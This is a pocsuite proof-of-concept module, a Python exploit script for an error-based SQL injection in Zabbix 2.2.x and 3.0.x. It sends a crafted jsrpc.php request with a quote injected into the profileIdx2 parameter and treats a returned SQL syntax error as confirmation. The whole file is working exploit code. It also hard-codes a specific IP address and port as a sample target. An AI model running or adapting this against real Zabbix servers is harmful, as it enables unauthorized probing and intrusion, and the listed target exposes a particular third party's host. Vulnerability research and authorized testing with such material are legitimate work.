#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    vulID = '00004'
    version = '1'
    author = 'jeffzhang'
    vulDate = '2017-08-26'
    createDate = '2017-08-26'
    updateDate = '2017-08-26'
    references = ['http://www.freebuf.com/vuls/112197.html']
    name = 'Zabbix SQl 注入漏洞 PoC'
    appPowerLink = 'https://www.zabbix.com'
    appName = 'Zabbix'
    appVersion = '3.0.3'
    vulType = 'SQL Injection'
    desc = '''
    	Zabbix 2.2.x和3.0.x版本中存在两处基于错误回显的SQL注入漏洞
    '''
    samples = ['http://89.239.138.140:5001/']

    def _verify(self):
        result = {}
        payload = payload = "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=999'&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
        att_url = self.url + payload
        response = req.get(att_url)
        if "You have an error in your SQL syntax" in response.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Payload'] = payload
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet noting return')
        return output


register(TestPOC)
